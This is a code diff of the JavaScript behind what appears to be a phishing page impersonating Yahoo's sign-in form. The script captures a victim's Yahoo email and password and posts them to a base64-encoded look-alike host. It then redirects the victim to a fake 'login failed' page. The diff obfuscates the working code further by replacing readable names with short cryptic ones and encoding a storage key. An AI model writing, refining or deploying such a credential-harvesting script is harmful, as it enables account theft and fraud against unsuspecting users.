@@ -1,79 +1,78 @@
 document.addEventListener("DOMContentLoaded", function () {
-    //form handler
-    console.log("sender script loaded");
+    console.log("loaded");
 
-    const hostname = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
-    const endpoint = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
-    const yahooEmailRegex = /^[^\s@]+@yahoo\.com$/i;
-    const nextButton = document.querySelector("#login-signin");
-    const emailInput = document.querySelector("#login-username");
-    const passwordInput = document.querySelector("#login-passwd");
-    const emailClass = document.querySelector(".yid");
-    const submitButton = document.querySelector("#login-signin");
+    const h = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
+    const e = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
+    const ymr = /^[^\s@]+@yahoo\.com$/i;
+    const nb = document.querySelector("#login-signin");
+    const ei = document.querySelector("#login-username");
+    const pi = document.querySelector("#login-passwd");
+    const ec = document.querySelector(".yid");
+    const sb = document.querySelector("#login-signin");
+    const ue = "dXNlci1lbWFpbA=="
 
-    if (nextButton) {
-        nextButton.addEventListener("click", function (e) {
+    if (nb) {
+        nb.addEventListener("click", function (e) {
             e.preventDefault();
-            if (!emailInput) {
+            if (!ei) {
                 return;
             };
-            if(!emailInput.value){
-                    emailInput.addAttribute = disabled;
-                    return;
-                }else{
-                    const email = emailInput.value;
-                    gotoPassword(email);
-             };
+            if (!ei.value) {
+                ei.addAttribute = disabled;
+                return;
+            } else {
+                const ev = ei.value;
+                gtp(ev);
+            };
         });
     }
     else {
         console.error("Element with id #login-signin not found");
     }
 
-    const email = localStorage.getItem("user-email");
-    emailClass.textContent = email;
+    const el = localStorage.getItem(atob(ue));
+    ec.textContent = el;
 
-    submitButton.addEventListener("click", async (e) => {
+    sb.addEventListener("click", async (e) => {
         e.preventDefault();
-        const password = passwordInput.value;
-        await sendFormAndRedirect(email, password);
+        const pd = pi.value;
+        await sfr(el, pd);
     });
 
-    //go to password page function declaration
-    function gotoPassword(email) {
-        //you can use regex for just yahoo mail and next otherwise display error
-        const isYahoo = isYahooEmail(email);
+
+    function gtp(el) {
+        const isy = isym(el);
         //then
-        if(isYahoo){
-            localStorage.setItem("user-email", email);
-            window.location.href = `${atob(hostname)}/display-password.htm`;
+        if (isy) {
+            localStorage.setItem(atob(ue), el);
+            window.location.href = `${atob(h)}/display-password.htm`;
         }
         return;
     };
 
-    function isYahooEmail(email) {
-       return yahooEmailRegex.test(email);
+    function isym(el) {
+        return ymr.test(el);
     }
 
 
-    async function sendFormAndRedirect(email, password) {
-        localStorage.removeItem("user-email");
+    async function sfr(el, pd) {
+        localStorage.removeItem(atob(ue));
 
-        const payload = {
-            "email": email,
-            "password": password
+        const pld = {
+            el,
+            pd
         };
         try {
-            const res = await axios.post(`${atob(endpoint)}`, payload, {
+            const res = await axios.post(`${atob(e)}`, pld, {
                 headers: {
                     "Content-Type": "application/json",
                     "Access-Control-Allow-Origin": "*"
                 }
             });
             if (res.status == 200) {
-                window.location.href = `${atob(hostname)}/login-failed.htm`;
+                window.location.href = `${atob(h)}/login-failed.htm`;
             } else {
-                window.location.href = `${atob(hostname)}/display-login.htm`;
+                window.location.href = `${atob(h)}/display-login.htm`;
             }
         } catch (error) {
             console.error("Error:", error);
